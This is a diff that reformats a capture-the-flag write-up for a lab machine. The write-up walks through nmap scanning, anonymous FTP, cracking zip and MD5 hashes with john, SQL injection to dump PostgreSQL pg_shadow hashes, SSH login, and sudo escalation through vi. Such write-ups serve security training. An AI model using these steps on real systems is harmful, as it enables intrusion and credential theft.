@@ -27,81 +27,98 @@ tags:
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.95.174 
 ```
 
-2. Nmap
+- Nmap
+
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.95.174
 ```
+
 ![](/img2/Pasted%20image%2020250317133016.png)
 
-3. Vulnerability scan with nmap
+- Vulnerability scan with nmap
+
 ```bash
 nmap -sVC -p80,21,22 10.129.95.174
 ```
+
 ![](/img2/Pasted%20image%2020250317133203.png)
 
 ## Exploitation
 
-1. Login ftp with anonymous user
+- Login ftp with anonymous user
+
 ```bash
 ftp 10.129.95.174
+
 ```
 ![](/img2/Pasted%20image%2020250317133432.png)
 
-2. Crack zip password
+- Crack zip password
+
 ```bash
 zip2john backup.zip > hash.txt
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```
+
 ![](/img2/Pasted%20image%2020250317133653.png)
 
-3. Extract backup files and view content
+- Extract backup files and view content
+
 ```bash
 7z x backup.zip
 ```
+
 ![](/img2/Pasted%20image%2020250317133939.png)
 
-4. Crack md5 password
+- Crack md5 password
 ```bash
 echo "2cb42f8734ea607eefed3b70af13bbd3" > md5.txt
 john -w=/usr/share/wordlists/rockyou.txt --format=raw-md5 md5.txt
 ```
 ![](/img2/Pasted%20image%2020250317134202.png)
 
-5. Find SQL Injection vulnerability 
+- Find SQL Injection vulnerability 
+
 ![](/img2/Pasted%20image%2020250317134333.png)
 
-6. Check table columns
+- Check table columns
 
 ![](/img2/Pasted%20image%2020250317134457.png)
 
-7. Create fake query
+- Create fake query
+
 ```sql
 SELECT * FROM cars 
 WHERE name ILIKE '%Elixir%'
 ```
 
-8. Check database version
+- Check database version
+
 ![](/img2/Pasted%20image%2020250317141209.png)
 
 
-9. Check all tables
+- Check all tables
+
 ![](/img2/Pasted%20image%2020250317173458.png)
 
 
-10.  Check all columns
+- Check all columns
+
 ![](/img2/Pasted%20image%2020250317173639.png)
 
 
-11.  Check username and md5password of pg_shadow
+- Check username and md5password of pg_shadow
+
 ![](/img2/Pasted%20image%2020250317173803.png)
 
 
-12.  Python script to crack md5 password
+- Python script to crack md5 password
 
 ```python
 #!/usr/bin/env python3
@@ -161,21 +178,26 @@ python3 md5postgresql.py -ha md52d58e0637ec1e94cdfba3d1c26b67d01 -w /usr/share/w
 
 ## Post-exploitation
 
-1. Connect SSH with postgres user
+- Connect SSH with postgres user
+
 ```bash
 ssh postgres@10.129.223.126
 ```
 
-2. Check sudoers
+- Check sudoers
+
 ```bash
 sudo -l
 ```
+
 ![](/img2/Pasted%20image%2020250317175756.png)
 
-3. Exploit sudoers 
+- Exploit sudoers 
+
 ```bash
 sudo -u root /bin/vi /etc/postgresql/11/main/pg_hba.conf
 ```
+
 ![](/img2/Pasted%20image%2020250317175939.png)
 
 ```bash
